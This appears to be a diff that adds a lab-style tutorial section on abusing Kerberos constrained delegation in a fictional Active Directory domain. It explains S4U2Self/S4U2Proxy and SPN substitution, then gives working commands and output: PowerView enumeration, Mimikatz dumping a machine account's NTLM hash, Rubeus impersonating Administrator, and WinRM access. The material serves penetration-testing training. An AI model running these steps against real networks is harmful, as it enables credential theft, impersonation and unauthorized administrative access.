@@ -1282,3 +1282,238 @@ svc-backup:1113:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c5
 svc-scan:1114:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 <SNIP>
 ```
+
+## Constrained Delegation
+
+### From Windows
+
+Constrained delegation was first introduced with WIndows Server 2003 and it was intended to restrict the services that a server can impersonate a user for, giving administrators the ability to specify application trust boundaries.
+
+An example of constrained delegation is a researcher logging in to a reporting application. When the user logs in, the backend database server must apply the researcher's database permissions, not the permissions of the service account that the application runs under.
+
+To accomplish this, the service needs Kerberos-constrained delegation enabled so that the user's Kerberos ticket is used to access the database when the researcher logs in. In this example, the front-web server is impersonating the user to the backend database, providing them access to only the data they can view or edit.
+
+![kerberos attacks 8](../../../images/kerberos_attacks8.png)
+
+#### Abuse any Service
+
+In order to understand this, it is necessary to recall the structure of the AP-REQ request, a request made by the user to the service once the TGS ticket for that service is received.
+
+![kerberos attacks 9](../../../images/kerberos_attacks9.png)
+
+The diagram shows that this request contains two elements: an authenticator and a TGS ticket.
+
+The Service Ticket or TGS ticket is also composed of two parts. An unencrypted part containing the SPN of the requested service, and an encrypted part containing the user's information and a session key. An attacker can modify the service name without invalidating his request, as the service name is not encrypted.
+
+In constrained delegation, delegation is only allowed for a specific list of SPNs. If an attacker has compromised a service account with constrained delegation, they can relay received authentication attempts to one or more SPNs in the list.
+
+To do so, the attacker will use the `S4U2Proxy` extension because it will allow them to obtain a valid TGS ticket on behalt of the user. The attacker, therefore, has a valid TGS ticket for a specific SPN destined for a particular service account. However, the attacker won't be able to use this TGS ticket towards a different service account since the content of the TGS ticket is encrypted with the key of the requested service. Another service account will not be able to decrypt the TGS ticket or Service Ticket.
+
+On the other hand, if the service ticket account exposes several services, then the attacker can modify the SPN to access a different service exposed by that account.
+
+This is very often the case with machine accounts. These are all service accounts that expose multiple services, such as CIFS, SPOOLER, or TERMSRV. An exhaustive list is available [on the Microsoft site](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names).
+
+In this situation, if constrained delegation normally only allows authentication to be delegated to a particular service exposed by a machine account, for example, the SQL service, the attacker can modify the SPN in their AP-REQ request and access all other services offered by the account, for example the CIFS service. If the delegated user is the local administrator on the target machine, then the attacker can compromise that machine.
+
+![kerberos attacks 10](../../../images/kerberos_attacks10.png)
+
+The limitation of this attack is that it is necessary to wait for a user to authenticate to the compromised service account. It is not always obvious that a privileged user logs in regularly.
+
+#### Impersonate any User
+
+If you compromise an account with constrained delegation, you can delegate the authentication to any service offered by the account in the authorized list.
+
+If this constrained delegation allows protocol transition, you can pretend to be anyone arbitrarily, to authenticate against these services. This option is set here:
+
+![kerberos attacks 11](../../../images/kerberos_attacks11.png)
+
+You can use the `S4U2Self` extension if protocol transition is enabled. It allows a service to obtain a forwordable service ticket to itself on behalf of any user.
+
+Since you can retrieve a TGS ticket as any user, you can perform the previous attack without waiting for anyone's authentication.
+
+#### Attack Example
+
+##### Enumerating with PowerView
+
+First, you will use PowerView to find users and computers with constrained delegation privileges.
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainComputer -TrustedToAuth
+
+logoncount                    : 35
+badpasswordtime               : 12/31/1600 6:00:00 PM
+distinguishedname             : CN=DMZ01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
+objectclass                   : {top, person, organizationalPerson, user...}
+badpwdcount                   : 0
+lastlogontimestamp            : 3/23/2023 10:09:29 AM
+objectsid                     : S-1-5-21-1870146311-1183348186-593267556-1118
+samaccountname                : DMZ01$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : MACHINE_ACCOUNT
+countrycode                   : 0
+cn                            : DMZ01
+accountexpires                : NEVER
+whenchanged                   : 3/30/2023 2:51:35 PM
+instancetype                  : 4
+usncreated                    : 12870
+objectguid                    : eaebb114-2638-40ec-9617-8715c4d3057a
+operatingsystem               : Windows Server 2019 Standard
+operatingsystemversion        : 10.0 (17763)
+lastlogoff                    : 12/31/1600 6:00:00 PM
+msds-allowedtodelegateto      : {www/WS01.INLANEFREIGHT.LOCAL, www/WS01}
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/DMZ01, WSMAN/DMZ01.INLANEFREIGHT.LOCAL, TERMSRV/DMZ01,
+                                TERMSRV/DMZ01.INLANEFREIGHT.LOCAL...}
+lastlogon                     : 4/1/2023 10:02:15 AM
+iscriticalsystemobject        : False
+usnchanged                    : 41084
+useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated                   : 10/14/2022 12:10:03 PM
+primarygroupid                : 515
+pwdlastset                    : 3/23/2023 10:20:32 AM
+msds-supportedencryptiontypes : 28
+name                          : DMZ01
+dnshostname                   : DMZ01.INLANEFREIGHT.LOCAL
+```
+
+The account `DMT01$` has `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC attribute set, which means it has constrained delegation with protocol transition set, and the only allowed service for delegation is `www/WS01.inlanefreight.local`.
+
+##### Requesting Valid TGS Ticket
+
+You can use Rubeus to ask for a valid TGS ticket from an arbitrary user to access the HTTP service on the WS01 host. To successfully perform this attack, you will need to obtain the NTLM password hash of the DMZ01$ machine account. You can obtain this using Mimikatz.
+
+```powershell
+PS C:\Tools> .\mimikatz.exe privilege::debug sekurlsa::msv exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::msv
+
+Authentication Id : 0 ; 414620 (00000000:0006539c)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/1/2023 7:39:12 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : DMZ01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ff955e93a130f5bb1a6565f32b7dc127
+         * SHA1     : f9232403611aa86f51a05c64e1abd86ce4021ff1
+<SNIP>
+```
+
+##### Constrained Delegation Attack
+
+```powershell
+PS C:\Tools> .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: ff955e93a130f5bb1a6565f32b7dc127
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\DMZ01$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFMDCCBSygAwIBBaEDAgEWooIEMjCCBC5hggQqMIIEJqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggPcMIID2KADAgESoQMC
+      <SNIP>
+
+
+[*] Action: S4U
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2self request for: 'DMZ01$@INLANEFREIGHT.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator@INLANEFREIGHT.LOCAL' to 'DMZ01$@INLANEFREIGHT.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGJDCCBiCgAwIBBaEDAgEWooIFEDCCBQxhggUIMIIFBKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiEzARoAMCAQGhCjAIGwZTUUwwMSSjggTPMIIEy6ADAgESoQMCAQGiggS9BIIEuY/s7XKb3zZMjzGB
+      <SNIP>
+
+[*] Impersonating user 'Administrator' to target SPN 'www/WS01.inlanefreight.local'
+[*]   Final ticket will be for the alternate service 'http'
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (fe80::c872:c68d:a355:e6f3%11)
+[*] Building S4U2proxy request for service: 'www/WS01.inlanefreight.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'http'
+[*] base64(ticket.kirbi) for SPN 'http/WS01.inlanefreight.local':
+
+      doIG/jCCBvqgAwIBBaEDAgEWooIF4DCCBdxhggXYMIIF1KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKzApoAMCAQKhIjAgGwRodHRwGxhXUzAxLmlubGFuZWZyZWlnaHQubG9jYWyjggWHMIIFg6ADAgES
+      <SNIP>
+```
+
+This output from Rubeus is great, as you can see what's going on. First, Rubeus asks for a TGT so that you can be in the context of DMZ01$. Then it performs an S4U2Self request to get a TGS ticket as Administrator.
+
+```
+[*] Got a TGS for 'Administrator@INLANEFREIGHT.LOCAL' to 'DMZ01$@INLANEFREIGHT.LOCAL'
+```
+
+Finally, it uses this TGS ticket to perform a S4U2Proxy request and will update the SPN to match what you requested, which is the HTTP service.
+
+```
+[*] Impersonating user 'Administrator' to target SPN 'www/WS01.inlanefreight.local'
+[*]   Final ticket will be for the alternate service 'http'
+```
+
+##### Verifying New Ticket
+
+You can check your new ticket with the `klist` command.
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x3f22d97
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ INLANEFREIGHT.LOCAL
+        Server: http/WS01.inlanefreight.local @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 8/15/2020 10:37:16 (local)
+        End Time:   8/15/2020 20:37:16 (local)
+        Renew Time: 8/22/2020 10:37:16 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+##### Using the Ticket for Remote Access from DMZ01
+
+This ticket can be used to get a remote shell via WinRM on `WS01.inlanefreight.local`:
+
+```powershell
+PS C:\Tools> Enter-PSSession ws01.inlanefreight.local
+
+[ws01.inlanefreight.local]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+
+inlanefreight\administrator
+```
+
